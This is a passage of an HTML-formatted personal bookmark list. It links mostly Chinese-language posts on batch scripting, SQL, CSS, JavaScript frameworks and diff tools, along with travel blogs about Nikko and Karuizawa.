rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:-kuGRcOM_IoJ:louis176127.pixnet.net/blog/</a><br>post/183637807-sql-2012%25E6%2596%25B0%25E5%258A%259F%25E8%2583%25BD-offset-fetch+&amp;cd=3&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw&amp;lr=lang_zh-TW<br><a href=\"http://blog.miniasp.com/post/2009/11/03/How-to-get-system-date-time-in-batch-file-part-III.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/11/03/How-to-get-system-date-time-in-batch-file-part-III.aspx</a><br><a href=\"http://blog.miniasp.com/post/2009/11/03/How-to-get-system-date-time-in-batch-file-part-III.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/11/03/How-to-get-system-date-time-in-batch-file-part-III.aspx</a></p>\n<p>DOS 批处理输出日期时分秒星期（年-月-日 时-分-秒）<br><a href=\"http://www.edbiji.com/doccenter/showdoc/31/nav/297.html\" target=\"_blank\" rel=\"noopener\">http://www.edbiji.com/doccenter/showdoc/31/nav/297.html</a></p>\n<p>DOS 不死 系列文章列表 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天<br><a href=\"http://ithelp.ithome.com.tw/users/20005121/ironman/213\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/users/20005121/ironman/213</a></p>\n<p>自動備份 Log 的 Batch 小程式 ~ Night Wind’s<br><a href=\"http://www.nws.tw/2012/01/logbatch.html\" target=\"_blank\" rel=\"noopener\">http://www.nws.tw/2012/01/logbatch.html</a></p>\n<p>BAT 批次指令： IF 的功能介紹 - 一般電腦軟體討論 - 麻辣家族討論版版<br><a href=\"http://forum.twbts.com/thread-10186-1-1.html\" target=\"_blank\" rel=\"noopener\">http://forum.twbts.com/thread-10186-1-1.html</a></p>\n<p>Apache 連線數已滿,如何將之後連線的導向另一個網頁(告知 server 達上限人數)???<br><a href=\"http://phorum.study-area.org/index.php?topic=28689.0\" target=\"_blank\" rel=\"noopener\">http://phorum.study-area.org/index.php?topic=28689.0</a></p>\n<p><a href=\"http://ww1.jstorage.info/\" target=\"_blank\" rel=\"noopener\">http://ww1.jstorage.info/</a><br><a href=\"http://ww1.jstorage.info/\" target=\"_blank\" rel=\"noopener\">http://ww1.jstorage.info/</a></p>\n<p>2016 年の前端，瘋什麼 ReactJS？ – 前端魔法研究室 – Medium<br><a href=\"https://medium.com/4cats-io/2016-%E5%B9%B4%E3%81%AE%E5%89%8D%E7%AB%AF-%E7%98%8B%E4%BB%80%E9%BA%BC-reactjs-4727a6ecc85a\" target=\"_blank\" rel=\"noopener\">https://medium.com/4cats-io/2016-%E5%B9%B4%E3%81%AE%E5%89%8D%E7%AB%AF-%E7%98%8B%E4%BB%80%E9%BA%BC-reactjs-4727a6ecc85a</a></p>\n<p>如何在 Windows 下撰寫批次檔，簡化常態性工作？ | iThome<br><a href=\"http://www.ithome.com.tw/node/47779\" target=\"_blank\" rel=\"noopener\">http://www.ithome.com.tw/node/47779</a></p>\n<p><a href=\"http://blog.miniasp.com/post/2009/06/24/Sleep-command-in-Batch.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/06/24/Sleep-command-in-Batch.aspx</a><br><a href=\"http://blog.miniasp.com/post/2009/06/24/Sleep-command-in-Batch.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/06/24/Sleep-command-in-Batch.aspx</a></p>\n<p>各浏览器对 document.getElementById 等方法的实现差异 - snandy - 博客园<br><a href=\"http://www.cnblogs.com/snandy/archive/2011/03/24/1993380.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/snandy/archive/2011/03/24/1993380.html</a></p>\n<p>軽井沢 石の教会 内村鑑三記念堂<br><a href=\"http://www.stonechurch.jp/\" target=\"_blank\" rel=\"noopener\">http://www.stonechurch.jp/</a></p>\n<p>2017 日本東京、日光、鬼怒川自由行行程規劃 @ King Chen 旅遊札記(ikimasho travel notes) :: 痞客邦 PIXNET ::<br><a href=\"http://ch3126.pixnet.net/blog/\" target=\"_blank\" rel=\"noopener\">http://ch3126.pixnet.net/blog/</a><br>post/108710125-2017%E6%97%A5%E6%9C%AC%E6%9D%B1%E4%BA%AC%E3%80%81%E6%97%A5%E5%85%89%E3%80%81%E9%AC%BC%E6%80%92%E5%B7%9D%E8%87%AA%E7%94%B1%E8%A1%8C%E8%A1%8C%E7%A8%8B%E8%A6%8F%E5%8A%83<br>▌ 東京自由行 ▌♥ 輕井澤一日遊行程分享 ♥ 輕井澤交通+JR 東京廣域周遊券 JR Tokyo Wide Pass (高原教堂、石之教堂、星野溫泉、輕井澤王子 outlet)by 陽光男孩 @ 野蠻王妃愛漂亮 :: 痞客邦 PIXNET ::<br><a href=\"http://cline1413.pixnet.net/blog/post/426749051--%E2%96%8C%E6%9D%B1%E4%BA%AC%E8%87%AA%E7%94%B1%E8%A1%8C-%E2%96%8C%E2%99%A5-%E8%BC%95%E4%BA%95%E6%BE%A4%E4%B8%80%E6%97%A5%E9%81%8A%E8%A1%8C%\" target=\"_blank\" rel=\"noopener\">http://cline1413.pixnet.net/blog/post/426749051--%E2%96%8C%E6%9D%B1%E4%BA%AC%E8%87%AA%E7%94%B1%E8%A1%8C-%E2%96%8C%E2%99%A5-%E8%BC%95%E4%BA%95%E6%BE%A4%E4%B8%80%E6%97%A5%E9%81%8A%E8%A1%8C%</a><br>E7%A8%8B%E5%88%86%E4%BA%AB%E2%99%A5<br>【日光】從淺草出發交通案內＆各種周遊券介紹 @ 乖乖做好 :: 痞客邦 PIXNET ::<br><a href=\"http://iiko.pixnet.net/blog/post/306715923-%E3%80%90%E6%97%A5%E5%85%89%E3%80%91%E5%BE%9E%E6%B7%BA%E8%8D%89%E5%87%BA%E7%99%BC%E4%BA%A4%E9%80%9A%E6%A1%88%E5%85%A7%EF%BC%86%E5%90%84%E7%A8%AE\" target=\"_blank\" rel=\"noopener\">http://iiko.pixnet.net/blog/post/306715923-%E3%80%90%E6%97%A5%E5%85%89%E3%80%91%E5%BE%9E%E6%B7%BA%E8%8D%89%E5%87%BA%E7%99%BC%E4%BA%A4%E9%80%9A%E6%A1%88%E5%85%A7%EF%BC%86%E5%90%84%E7%A8%AE</a><br>%E5%91%A8%E9%81%8A%E5%88%B8%E4%BB%8B<br>草莓吃到飽之親吻櫪乙女@日光 @ E=(km)^2 :: 痞客邦 PIXNET ::<br><a href=\"http://kanagawalin.pixnet.net/blog/post/342444416-%E8%8D%89%E8%8E%93%E5%90%83%E5%88%B0%E9%A3%BD%E4%B9%8B%E8%A6%AA%E5%90%BB%E6%AB%AA%E4%B9%99%E5%A5%B3@%E6%97%A5%E5%85%89\" target=\"_blank\" rel=\"noopener\">http://kanagawalin.pixnet.net/blog/post/342444416-%E8%8D%89%E8%8E%93%E5%90%83%E5%88%B0%E9%A3%BD%E4%B9%8B%E8%A6%AA%E5%90%BB%E6%AB%AA%E4%B9%99%E5%A5%B3@%E6%97%A5%E5%85%89</a></p>\n<p>&lt;&lt;日本泡湯不用好害羞唷～&gt;&gt; @ 原(HARA)さんおすすめの旅 :: 痞客邦 PIXNET ::<br><a href=\"http://ychiati121.pixnet.net/blog/post/268043102-%3C%3C%E6%97%A5%E6%9C%AC%E6%B3%A1%E6%B9%AF%E4%B8%8D%E7%94%A8%E5%A5%BD%E5%AE%B3%E7%BE%9E%E5%94%B7%EF%BD%9E%3E%3E\" target=\"_blank\" rel=\"noopener\">http://ychiati121.pixnet.net/blog/post/268043102-%3C%3C%E6%97%A5%E6%9C%AC%E6%B3%A1%E6%B9%AF%E4%B8%8D%E7%94%A8%E5%A5%BD%E5%AE%B3%E7%BE%9E%E5%94%B7%EF%BD%9E%3E%3E</a></p>\n<p>构建系统搭建记录 · Issue #43 · cosven/cosven.github.io<br><a href=\"https://github.com/cosven/cosven.github.io/issues/43\" target=\"_blank\" rel=\"noopener\">https://github.com/cosven/cosven.github.io/issues/43</a></p>\n<p><a href=\"http://ephrain.pixnet.net/blog/post/61770874-%5Bdocker%5D-%E4%BD%BF%E7%94%A8%E9%9D%9E-root-%E6%AC%8A%E9%99%90%E4%BE%86%E5%9F%B7%E8%A1%8C-docker-client\" target=\"_blank\" rel=\"noopener\">http://ephrain.pixnet.net/blog/post/61770874-%5Bdocker%5D-%E4%BD%BF%E7%94%A8%E9%9D%9E-root-%E6%AC%8A%E9%99%90%E4%BE%86%E5%9F%B7%E8%A1%8C-docker-client</a><br><a href=\"http://ephrain.pixnet.net/blog/post/61770874-%5Bdocker%5D-%E4%BD%BF%E7%94%A8%E9%9D%9E-root-%E6%AC%8A%E9%99%90%E4%BE%86%E5%9F%B7%E8%A1%8C-docker-client\" target=\"_blank\" rel=\"noopener\">http://ephrain.pixnet.net/blog/post/61770874-%5Bdocker%5D-%E4%BD%BF%E7%94%A8%E9%9D%9E-root-%E6%AC%8A%E9%99%90%E4%BE%86%E5%9F%B7%E8%A1%8C-docker-client</a></p>\n<p>Jain’s Blog: JAVA - string.split 解決空字串的問題<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:7Vi3Uiz8FJcJ:jain0921.blogspot.com/2012/01/java-stringsplit.html+&amp;cd=1&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:7Vi3Uiz8FJcJ:jain0921.blogspot.com/2012/01/java-stringsplit.html+&amp;cd=1&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw</a></p>\n<p>從東京出發・日光交通攻略 @ 別出馨裁 :: 痞客邦 PIXNET ::<br><a href=\"http://hsinyun0531.pixnet.net/blog/post/199564245-%E5%BE%9E%E6%9D%B1%E4%BA%AC%E5%87%BA%E7%99%BC%E3%83%BB%E6%97%A5%E5%85%89%E4%BA%A4%E9%80%9A%E6%94%BB%E7%95%A5\" target=\"_blank\" rel=\"noopener\">http://hsinyun0531.pixnet.net/blog/post/199564245-%E5%BE%9E%E6%9D%B1%E4%BA%AC%E5%87%BA%E7%99%BC%E3%83%BB%E6%97%A5%E5%85%89%E4%BA%A4%E9%80%9A%E6%94%BB%E7%95%A5</a></p>\n<p>Ally 的旅行小事: 東武鐵道 – 日光、鬼怒川主題樂園周遊券<br><a href=\"http://phoennivia.blogspot.com/2010/08/blog-post_2913.html\" target=\"_blank\" rel=\"noopener\">http://phoennivia.blogspot.com/2010/08/blog-post_2913.html</a></p>\n<p>[ cmd ] Windows 網芳 net use command 指令 - Evil-M\\$<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:0XzHmtANmtcJ:evil-ms.blogspot.com/2010/05/windows-net-use-command.html+&amp;cd=3&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:0XzHmtANmtcJ:evil-ms.blogspot.com/2010/05/windows-net-use-command.html+&amp;cd=3&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw</a></p>\n<p>xcopy - 檔案.資料夾複製指令 @ 藍影 :: 痞客邦 PIXNET ::<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:8Ht3irTdHlgJ:edisonshih.pixnet.net/blog/\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:8Ht3irTdHlgJ:edisonshih.pixnet.net/blog/</a><br>post/28109815-xcopy—%25E6%25AA%2594%25E6%25A1%2588.%25E8%25B3%2587%25E6%2596%2599%25E5%25A4%25BE%25E8%25A4%2587%25E8%25A3%25BD%25E6%258C%2587%25E4%25BB%25A4+&amp;cd=2&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw<br>破解網頁鎖圖，鎖右鍵，選取等功能<br><a href=\"https://www.puritys.me/docs-blog/\" target=\"_blank\" rel=\"noopener\">https://www.puritys.me/docs-blog/</a><br>article-77-%E7%A0%B4%E8%A7%A3%E7%B6%B2%E9%A0%81%E9%8E%96%E5%9C%96%EF%BC%8C%E9%8E%96%E5%8F%B3%E9%8D%B5%EF%BC%8C%E9%81%B8%E5%8F%96%E7%AD%89%E5%8A%9F%E8%83%BD.html<br>不排序去除文件中的重复行<br><a href=\"http://edyfox.codecarver.org/html/bash_unique_lines_no_sorting.html\" target=\"_blank\" rel=\"noopener\">http://edyfox.codecarver.org/html/bash_unique_lines_no_sorting.html</a></p>\n<p>日本行李 - HackMD<br><a href=\"https://hackmd.io/MYVgzCAcYJwIYFoCmAjYB2BAWOA2RcSYYCAZgEzoojmRFakxA===#\" target=\"_blank\" rel=\"noopener\">https://hackmd.io/MYVgzCAcYJwIYFoCmAjYB2BAWOA2RcSYYCAZgEzoojmRFakxA===#</a></p>\n<p>30 秒認識 MQTT – 阿喵就像家<br><a href=\"https://mlwmlw.org/2015/09/30-%E7%A7%92%E8%AA%8D%E8%AD%98-mqtt/\" target=\"_blank\" rel=\"noopener\">https://mlwmlw.org/2015/09/30-%E7%A7%92%E8%AA%8D%E8%AD%98-mqtt/</a></p>\n<p>Socket 与 WebSocket | zrong’s blog<br><a href=\"http://zengrong.net/post/2199.htm\" target=\"_blank\" rel=\"noopener\">http://zengrong.net/post/2199.htm</a></p>\n<p>[ CSS ] – table thead 固定 – 混水摸魚 ╮(╯▽╰)╭<br><a href=\"https://www.webteach.tw/?p=701\" target=\"_blank\" rel=\"noopener\">https://www.webteach.tw/?p=701</a></p>\n<p>CSS Table Scrolling with Fixed Header for IE 7<br><a href=\"http://geekswithblogs.net/LSheu/archive/2009/01/30/css-table-scrolling-with-fixed-header-for-ie-7.aspx\" target=\"_blank\" rel=\"noopener\">http://geekswithblogs.net/LSheu/archive/2009/01/30/css-table-scrolling-with-fixed-header-for-ie-7.aspx</a></p>\n<p>Creating Cross-Browser Scrollable <tbody>s—A CSS-Only Approach<br><a href=\"https://www.tjvantoll.com/2012/11/10/creating-cross-browser-scrollable-tbody/\" target=\"_blank\" rel=\"noopener\">https://www.tjvantoll.com/2012/11/10/creating-cross-browser-scrollable-tbody/</a></tbody></p>\n<p>Adobe Experience Design(XD)怎麼用？有教學嗎？<br><a href=\"https://iask.tw/q/21WMS\" target=\"_blank\" rel=\"noopener\">https://iask.tw/q/21WMS</a></p>\n<p>PHP 裡 Foreach 一些測試 « darkland’s Blog<br><a href=\"http://jslee.logdown.com/posts/3107-foreach-in-php-testing\" target=\"_blank\" rel=\"noopener\">http://jslee.logdown.com/posts/3107-foreach-in-php-testing</a></p>\n<p>k1n9’s blog<br><a href=\"http://k1n9.me/\" target=\"_blank\" rel=\"noopener\">http://k1n9.me/</a></p>\n<p>BAT 檔執行時最小化 @ Thinking in Robert :: 痞客邦 PIXNET ::<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:Md_PwfjG6a4J:robertvmp.pixnet.net/blog/\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:Md_PwfjG6a4J:robertvmp.pixnet.net/blog/</a><br>post/26312642-bat-%25E6%25AA%2594%25E5%259F%25B7%25E8%25A1%258C%25E6%2599%2582%25E6%259C%2580%25E5%25B0%258F%25E5%258C%2596+&amp;cd=6&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw<br>jquery - Prevent users from submitting a form by hitting Enter - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/895171/prevent-users-from-submitting-a-form-by-hitting-enter\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/895171/prevent-users-from-submitting-a-form-by-hitting-enter</a></p>\n<p>T-SQL 中的 JOIN 語法解析 (for SQL Server) | 我的學習筆記 - 點部落<br><a href=\"https://dotblogs.com.tw/caubekimo/2010/07/28/16874\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/caubekimo/2010/07/28/16874</a></p>\n<p>tsql - LEFT JOIN vs. LEFT OUTER JOIN in SQL Server - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/406294/left-join-vs-left-outer-join-in-sql-server\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/406294/left-join-vs-left-outer-join-in-sql-server</a></p>\n<p>Select2 - The jQuery replacement for select boxes<br><a href=\"https://select2.github.io/\" target=\"_blank\" rel=\"noopener\">https://select2.github.io/</a></p>\n<p>SaML002-HK<br><a href=\"http://saml002hk.blogspot.com/\" target=\"_blank\" rel=\"noopener\">http://saml002hk.blogspot.com/</a></p>\n<p>MUKI space* - Simple, Personal and Life Style<br><a href=\"http://muki.tw/\" target=\"_blank\" rel=\"noopener\">http://muki.tw/</a></p>\n<p>2016 年十个必须尝试的设计工具_慕课手记<br><a href=\"http://www.imooc.com/article/3549\" target=\"_blank\" rel=\"noopener\">http://www.imooc.com/article/3549</a></p>\n<p>稀土区 - 优质设计开发资源分享<br><a href=\"https://xituqu.com/\" target=\"_blank\" rel=\"noopener\">https://xituqu.com/</a></p>\n<p>The best UX Prototyping Tools for mobile and desktop app design<br><a href=\"http://www.prototypr.io/\" target=\"_blank\" rel=\"noopener\">http://www.prototypr.io/</a></p>\n<p>7 Steps From jQuery Plugins to React Development<br><a href=\"http://dimaip.github.io/2017/02/15/from-jquery-to-react/\" target=\"_blank\" rel=\"noopener\">http://dimaip.github.io/2017/02/15/from-jquery-to-react/</a></p>\n<p>[jQuery]使用 jQuery 對 select 的操作 | 完美的半徑 - 點部落<br><a href=\"https://dotblogs.com.tw/alanjiang/2011/01/26/21061\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/alanjiang/2011/01/26/21061</a></p>\n<p>[javascript] 日曆製作方式| @ 資訊園 :: 痞客邦 PIXNET ::<br><a href=\"http://fecbob.pixnet.net/blog/post/43093030-%5Bjavascript%5D-%E6%97%A5%E6%9B%86%E8%A3%BD%E4%BD%9C%E6%96%B9%E5%BC%8F%7C\" target=\"_blank\" rel=\"noopener\">http://fecbob.pixnet.net/blog/post/43093030-%5Bjavascript%5D-%E6%97%A5%E6%9B%86%E8%A3%BD%E4%BD%9C%E6%96%B9%E5%BC%8F%7C</a></p>\n<p>Sphinx 初尝 — Sphinx 使用手册<br><a href=\"https://zh-sphinx-doc.readthedocs.io/en/latest/tutorial.html\" target=\"_blank\" rel=\"noopener\">https://zh-sphinx-doc.readthedocs.io/en/latest/tutorial.html</a></p>\n<p>msoedov/hacker-slides: A small UI for building presentation slides from markdown markup<br><a href=\"https://github.com/msoedov/hacker-slides\" target=\"_blank\" rel=\"noopener\">https://github.com/msoedov/hacker-slides</a></p>\n<p>Pandoc - Markdown 轉 PDF 格式 - 機械設計專題 (虎尾科大 MDE)<br><a href=\"http://project.mde.tw/blog/pandoc-markdown-zhuan-pdf-ge-shi.html\" target=\"_blank\" rel=\"noopener\">http://project.mde.tw/blog/pandoc-markdown-zhuan-pdf-ge-shi.html</a></p>\n<p>[請益] windows 背景執行 - 看板 PHP - 批踢踢實業坊<br><a href=\"https://www.ptt.cc/bbs/PHP/M.1334048685.A.A85.html\" target=\"_blank\" rel=\"noopener\">https://www.ptt.cc/bbs/PHP/M.1334048685.A.A85.html</a></p>\n<p>Vuejs2.0 文档攻略 - 组件 -动态组件<br><a href=\"http://larabase.com/posts/filter/category/9\" target=\"_blank\" rel=\"noopener\">http://larabase.com/posts/filter/category/9</a></p>\n<p>NULLIF(expr1,expr2)和 CASE 表达式 - 程序园<br><a href=\"http://www.voidcn.com/blog/topsjava/article/p-3787747.html\" target=\"_blank\" rel=\"noopener\">http://www.voidcn.com/blog/topsjava/article/p-3787747.html</a></p>\n<p>扭蛋盒玩專用展示盒 收藏盒 塑膠盒 pvc 盒 22x15x15 可放進海賊王水都娜美 DX 景品 蛇姬女帝 亂馬 1/2 - 露天拍賣<br><a href=\"http://goods.ruten.com.tw/item/show?21203184399417#info\" target=\"_blank\" rel=\"noopener\">http://goods.ruten.com.tw/item/show?21203184399417#info</a></p>\n<p>亞克力高達展示盒定做拼裝樂高防塵罩動漫手辦汽車模型盒高檔透明-淘宝网全球站<br><a href=\"https://world.taobao.com/\" target=\"_blank\" rel=\"noopener\">https://world.taobao.com/</a><br>item/520559525288.htm?fromSite=main&amp;ali_refid=a3_430620_1006:1105650261:N:%E6%A8%A1%E5%9E%8B%E7%9B%92:927bc8399452d6aa3269f92b73f6606c&amp;ali_trackid=1_927bc8399452d6aa3269f92b73f6606c<br>SD9012: IE6 IE7 IE8 中 getElementsByName 方法的参数不区分大小写 - W3Help<br><a href=\"http://w3help.org/zh-cn/causes/SD9012\" target=\"_blank\" rel=\"noopener\">http://w3help.org/zh-cn/causes/SD9012</a></p>\n<p>BX9010: 各浏览器中对直接以 id 或者 name 属性值获取元素存在差异 - W3Help<br><a href=\"http://w3help.org/zh-cn/causes/BX9010\" target=\"_blank\" rel=\"noopener\">http://w3help.org/zh-cn/causes/BX9010</a></p>\n<p>TibaMe<br><a href=\"https://www.tibame.com/q?pg=home_welcomeRedirected&amp;cx=22.20000\" target=\"_blank\" rel=\"noopener\">https://www.tibame.com/q?pg=home_welcomeRedirected&amp;cx=22.20000</a></p>\n<p>浏览器同源政策及其规避方法 - 阮一峰的网络日志<br><a href=\"http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a></p>\n<p>IE11 で Alt+Home、Alt+F4、Ctrl+F4 の制御が効かない · Issue #8 · pekotaro/disableBrowserShortcutKeys<br><a href=\"https://github.com/Pekotaro/disableBrowserShortcutKeys/issues/8\" target=\"_blank\" rel=\"noopener\">https://github.com/Pekotaro/disableBrowserShortcutKeys/issues/8</a></p>\n<p>JWorld@TW Java 論壇 - String a = null 是什么含义啊<br><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=29&amp;id=73474\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?bid=29&amp;id=73474</a></p>\n<p>events - javascript capture browser shortcuts (ctrl+t/n/w) - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/7295508/javascript-capture-browser-shortcuts-ctrlt-n-w\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/7295508/javascript-capture-browser-shortcuts-ctrlt-n-w</a></p>\n<p>502 Bad Gateway<br><a href=\"http://www.15jb.net/article/4303.html\" target=\"_blank\" rel=\"noopener\">http://www.15jb.net/article/4303.html</a></p>\n<p>javascript - IE e.target.id is not working - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/1143196/ie-e-target-id-is-not-working\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/1143196/ie-e-target-id-is-not-working</a></p>\n<p>瓶水相逢 - 艾小克 - 點部落<br><a href=\"https://dotblogs.com.tw/chhuang\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/chhuang</a></p>\n<p>How to copy TEXT to Clipboard on Button-Click<br><a href=\"https://codepen.io/shaikmaqsood/pen/XmydxJ/\" target=\"_blank\" rel=\"noopener\">https://codepen.io/shaikmaqsood/pen/XmydxJ/</a></p>\n<p>Re: [請益] 有無比較程式碼差異性的軟體 - 看板 EZsoft - 批踢踢實業坊<br><a href=\"https://www.ptt.cc/bbs/EZsoft/M.1206798987.A.8A9.html\" target=\"_blank\" rel=\"noopener\">https://www.ptt.cc/bbs/EZsoft/M.1206798987.A.8A9.html</a></p>\n<p><a href=\"http://absoluteyl.blogspot.com/2015/08/raspbian-raspbian.html\" target=\"_blank\" rel=\"noopener\">http://absoluteyl.blogspot.com/2015/08/raspbian-raspbian.html</a><br><a href=\"http://absoluteyl.blogspot.com/2015/08/raspbian-raspbian.html\" target=\"_blank\" rel=\"noopener\">http://absoluteyl.blogspot.com/2015/08/raspbian-raspbian.html</a></p>\n<p>[講座分享] 就此愛上 PhpStorm — 以 Laravel 開發為例 (線上讀書會) – Medium<br><a href=\"https://medium.com/@shengyou/full-in-love-with-phpstorm-f6d484109978\" target=\"_blank\" rel=\"noopener\">https://medium.com/@shengyou/full-in-love-with-phpstorm-f6d484109978</a></p>\n<p>Android 反編譯與防止被反編譯 | MagicLen<br><a href=\"https://magiclen.org/android-decompiler/\" target=\"_blank\" rel=\"noopener\">https://magiclen.org/android-decompiler/</a></p>\n<p>Diff Chars<br><a href=\"http://kpdecker.github.io/jsdiff/\" target=\"_blank\" rel=\"noopener\">http://kpdecker.github.io/jsdiff/</a></p>\n<p>cemerick/jsdifflib: A javascript library for diffing text and generating corresponding HTML views<br><a href=\"https://github.com/cemerick/jsdifflib\" target=\"_blank\" rel=\"noopener\">https://github.com/cemerick/jsdifflib</a></p>\n<p>Mergely - Diff online, merge documents<br><a href=\"http://www.mergely.com/editor\" target=\"_blank\" rel=\"noopener\">http://www.mergely.com/editor</a></p>\n<p>JavaScript based diff utility - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/3053587/javascript-based-diff-utility\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/3053587/javascript-based-diff-utility</a></p>\n<p>Spirit’s development notebook<br><a href=\"http://spirit-blog.logdown.com/\" target=\"_blank\" rel=\"noopener\">http://spirit-blog.logdown.com/</a></p>\n<p>Server Push: Websockets in HTML5<br><a href=\"http://onlinepush.blogspot.com/2014/09/websockets-in-html5.html\" target=\"_blank\" rel=\"noopener\">http://onlinepush.blogspot.com/2014/09/websockets-in-html5.html</a></p>\n<p>新手向：Vue 2.0 的建议学习顺序 - 知乎专栏<br><a href=\"https://zhuanlan.zhihu.com/p/23134551\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/23134551</a></p>\n<p>Create a Desktop Quiz Application Using Vue.js and Electron | Scotch<br><a href=\"https://scotch.io/tutorials/create-a-desktop-quiz-application-using-vue-js-and-electron\" target=\"_blank\" rel=\"noopener\">https://scotch.io/tutorials/create-a-desktop-quiz-application-using-vue-js-and-electron</a></p>\n<p>衞生署學生健康服務 - 漸進式肌肉鬆弛練習<br><a href=\"http://www.studenthealth.gov.hk/tc_chi/relaxation/relaxation.html\" target=\"_blank\" rel=\"noopener\">http://www.studenthealth.gov.hk/tc_chi/relaxation/relaxation.html</a></p>\n<p>少年，不要滥用箭头函数啊 · jingsam<br><a href=\"https://jingsam.github.io/2016/12/08/things-you-should-know-about-arrow-functions.html\" target=\"_blank\" rel=\"noopener\">https://jingsam.github.io/2016/12/08/things-you-should-know-about-arrow-functions.html</a></p>\n<p>你不知道的 This 和 Class - 每日頭條<br><a href=\"https://kknews.cc/zh-tw/other/l8oz3bz.html\" target=\"_blank\" rel=\"noopener\">https://kknews.cc/zh-tw/other/l8oz3bz.html</a></p>\n<p>html - difference between width auto and width 100 percent - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/17468733/difference-between-width-auto-and-width-100-percent\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/17468733/difference-between-width-auto-and-width-100-percent</a></p>\n<p>Collapsing margins——合并的外边距 | GeekPlux<br><a href=\"http://geekplux.com/2014/03/14/collapsing_margins.html\" target=\"_blank\" rel=\"noopener\">http://geekplux.com/2014/03/14/collapsing_margins.html</a></p>\n<p>jQuery Validation Engine 表单验证 - 前端开发仓库<br><a href=\"http://code.ciaoca.com/jquery/validation-engine/\" target=\"_blank\" rel=\"noopener\">http://code.ciaoca.com/jquery/validation-engine/</a></p>\n<p>A-Fu Design 網頁設計,程式設計,jQuery,JavaScripts,PHP,MySql,軟體開發,網頁製作<br><a href=\"https://fufuk.blogspot.com/\" target=\"_blank\" rel=\"noopener\">https://fufuk.blogspot.com/</a></p>\n<p>Web 在線教程<br><a href=\"http://www.w3big.com/zh-TW/index.html\" target=\"_blank\" rel=\"noopener\">http://www.w3big.com/zh-TW/index.html</a></p>\n<p>How do I save data in an application scope in PHP? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/3713311/how-do-i-save-data-in-an-application-scope-in-php\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/3713311/how-do-i-save-data-in-an-application-scope-in-php</a></p>\n<p>BGM 素材 | フリー BGM・音楽素材 MusMus<br><a href=\"http://musmus.main.jp/bgm.html\" target=\"_blank\" rel=\"noopener\">http://musmus.main.jp/bgm.html</a></p>\n<p>标签 - justjavac(迷渡)<br><a href=\"http://justjavac.com/tags.html#%E6%B5%AE%E7%82%B9%E6%95%B0-ref\" target=\"_blank\" rel=\"noopener\">http://justjavac.com/tags.html#%E6%B5%AE%E7%82%B9%E6%95%B0-ref</a></p>\n<p>JS 魔法堂：彻底理解 0.1 + 0.2 === 0.30000000000000004 的背后 - ^_^肥子 John - SegmentFault<br><a href=\"https://segmentfault.com/a/1190000005022170\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/a/1190000005022170</a></p>\n<p>Raspberry Pi 的應用 - 數位音樂播放器的再進化：Volumio 2 | IT 技術家<br><a href=\"http://blog.itist.tw/2016/11/build-audiophile-music-player-with-volumio2-on-raspberry-pi.html\" target=\"_blank\" rel=\"noopener\">http://blog.itist.tw/2016/11/build-audiophile-music-player-with-volumio2-on-raspberry-pi.html</a></p>\n<p>區域網設備發現之 Bonjour 協議 - 每日頭條<br><a href=\"https://kknews.cc/zh-tw/tech/o4ybmm.html\" target=\"_blank\" rel=\"noopener\">https://kknews.cc/zh-tw/tech/o4ybmm.html</a></p>\n<p>eclipse 启动优化，终于不那么卡了！ - 飞网<br><a href=\"http://www.cfei.net/archives/445\" target=\"_blank\" rel=\"noopener\">http://www.cfei.net/archives/445</a></p>\n<p>纯前端 Js 解决各种汉字 urlencode,urldecode（GBK、UTF-8 均可） – zcw 的博客<br><a href=\"http://zcw.me/blogwp/front-end-urldecode-gbk/\" target=\"_blank\" rel=\"noopener\">http://zcw.me/blogwp/front-end-urldecode-gbk/</a></p>\n<p><a href=\"http://coldnew.github.io/3aac9391/\" target=\"_blank\" 